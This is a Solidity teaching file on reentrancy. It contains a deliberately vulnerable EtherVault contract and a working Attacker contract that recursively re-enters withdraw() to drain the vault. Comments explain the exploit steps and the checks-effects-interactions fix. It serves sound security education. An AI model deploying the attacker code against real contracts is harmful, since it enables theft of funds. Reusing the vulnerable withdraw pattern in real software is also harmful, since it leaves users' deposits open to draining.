// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// VULNERABILITY: Reentrancy (Classic DAO-Style)
//
// WHAT IT IS:
//   The withdraw() function sends ETH to the caller BEFORE updating the
//   caller's internal balance. This violates the checks-effects-interactions
//   pattern, leaving the contract in an inconsistent state during the external
//   call.
//
// HOW IT IS EXPLOITED:
//   1. The attacker deploys the Attacker contract below and funds it.
//   2. Attacker calls EtherVault.deposit() to legitimately place some ETH
//      into the vault so they have a non-zero balance.
//   3. Attacker calls EtherVault.withdraw().
//   4. EtherVault executes: (bool success,) = msg.sender.call{value: amount}("")
//      This triggers the Attacker contract's receive() fallback.
//   5. Inside receive(), the Attacker immediately calls EtherVault.withdraw()
//      AGAIN. Because the vault has not yet updated balances[attacker], the
//      check `require(balance > 0)` still passes.
//   6. Steps 4-5 repeat recursively, draining the vault, until the call stack
//      runs out of gas or the vault balance hits zero.
//   7. On the way back out of the recursion, EtherVault finally sets
//      balances[attacker] = 0 — but the ETH is already gone.
//
//   This is exactly how ~$60 million was stolen from The DAO in June 2016.
//
// THE FIX:
//   Follow the checks-effects-interactions pattern:
//     1. CHECK:   require(balances[msg.sender] > 0)
//     2. EFFECT:  balances[msg.sender] = 0      <-- update state FIRST
//     3. INTERACT:(bool ok,) = msg.sender.call{value: amount}("")
//   Alternatively, use a reentrancy guard (a boolean mutex that reverts if
//   the function is entered while already executing). OpenZeppelin's
//   ReentrancyGuard is the standard library solution.
// =============================================================================

contract EtherVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: ETH is sent before the balance is zeroed out.
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Nothing to withdraw");

        // !! DANGER: external call before state update !!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // Too late — attacker has already re-entered and drained the vault.
        balances[msg.sender] = 0;
    }

    function totalBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ATTACKER CONTRACT — demonstrates how the exploit is executed
contract Attacker {
    EtherVault public vault;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vault) {
        vault = EtherVault(_vault);
    }

    // Step 1: fund this contract, deposit into vault, then trigger drain
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Send at least 1 ETH");
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw();
    }

    // Step 2: called by the vault's .call{} during each withdrawal.
    // Re-enters withdraw() while the vault's state is still stale.
    receive() external payable {
        if (address(vault).balance >= ATTACK_AMOUNT) {
            vault.withdraw();
        }
    }

    function collectStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
